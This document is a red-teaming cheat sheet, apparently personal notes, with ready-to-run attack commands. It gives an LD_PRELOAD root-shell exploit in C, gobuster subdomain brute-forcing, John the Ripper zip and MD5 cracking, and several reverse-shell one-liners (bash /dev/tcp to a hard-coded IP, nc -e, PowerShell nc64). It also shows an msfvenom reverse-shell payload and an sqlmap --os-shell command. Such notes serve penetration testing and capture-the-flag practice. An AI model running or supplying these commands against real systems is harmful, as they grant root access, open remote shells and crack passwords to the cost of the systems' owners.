# Red Teaming

## Linux Privilege Escalation

### LD PRELOAD

For sudo -l: `(root) SETENV: NOPASSWD: <vulnerable_program>`

Prepare exploit

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/bash");
}

```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

And run:

```bash
sudo LD_PRELOAD=/<path_to_exploit>/shell.so <vulnerable_program>
```

## Bruteforce

### Bruteforce subdomains

```bash
gobuster vhost -w <path_to_dict_file> -u http://<url>
```

### Dictionaries

```bash
git clone https://github.com/danielmiessler/SecLists.git
```

### John

Crack zip/rar password

```bash
zip2john <zip_file> > zip.hashes
john --format=zip zip.hashes
```

md5

```bash
john --format=raw-md5 <hash_file>
```

## Reverse shell

### Netcat

Keys:

- -h help
- -v verbose
- -o output file
- -l listening
- -p port
- -s < host > use local IP
- -n Disable DNS & scan num ports over /etc/services
- -w num timeout (seconds)
- -q num time after EOF (seconds)
- -e file execute
- -с command shell command
- -k keep listening (after close session)

Example:

```bash
nc -lvnp <port>
```

### Connect to NetCat

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.42/1443 0>&1"
```
  
```bash
nc -e /bin/bash <your_ip> <port>
```

```cmd
powershell -c cd C:\Users\<user>\Downloads; .\nc64.exe -e cmd.exe <your_ip> <port>
```

### Reverse shell scripts

```bash
git clone https://github.com/BlackArch/webshells.git/
```

### Pretty shell ^^

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
  
### Create connector to nc
  
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<you_ip> LPORT=<you_port> -f elf > r.elf
```

Create http server

```bash
python -m http.server 80
```

## SQL Injection

### sqlmap

Example get os shell (any+query - injection place):

```bash
sqlmap -u 'http://<ip>/<path_to_dangerous_scrip>?<key>=any+query' --cookie="<key>=<value>" --os-shell
```
